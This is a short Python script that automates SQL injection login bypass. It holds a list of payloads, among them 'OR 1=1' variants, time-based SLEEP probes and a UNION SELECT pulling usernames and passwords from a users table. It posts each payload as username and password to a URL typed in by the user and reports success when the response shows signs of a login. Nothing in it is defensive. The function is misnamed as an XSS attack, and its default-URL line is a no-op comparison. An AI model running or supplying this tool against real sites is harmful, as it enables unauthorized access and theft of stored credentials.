import requests

pay = [
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR 1=1 #",
    "' OR SLEEP(3) --",
    "' UNION SELECT id, username, password FROM users --",
    "'' UNION SELECT NULL --",
    "' ORDER BY 3 --",
    "' ORDER BY 1 --",
    "' OR (SELECT COUNT(*) FROM users) > 0 --",
    "' OR 0x31=0x31 --",
    "' UNION SELECT 1, 'hacker', 'pass' --",
    "' OR name IN ('admin','root') --",
    "' OR name LIKE '%admin%' --",
    "admin' --",
    "' OR EXISTS(SELECT * FROM users) --",
    "' AND 1=2 --",
    "' AND 1=1 --"
]

def XssAttack():
    target = input("Enter target url: ")
    if target == "": target=="https://example.com"
    for payload in pay:
        config = {
            "username": payload,
            "password": payload
        }
        try:
            r = requests.post(target, data=config)
        except Exception as e:
            print(f"Request failed for payload: {payload}\nError: {e}")
            continue
        print(f"Payload: {payload}")
        print(f"Status: {r.status_code}")
        x=r.text[:200]# Show start of response
        with open("injected.html","w") as f:
            f.write(x)
        if "Welcome" in r.text or "/logout" in r.text:
            print(f"[+] Injection successful with: {payload}")
        else:
            print(f"[-] Not working: {payload}")
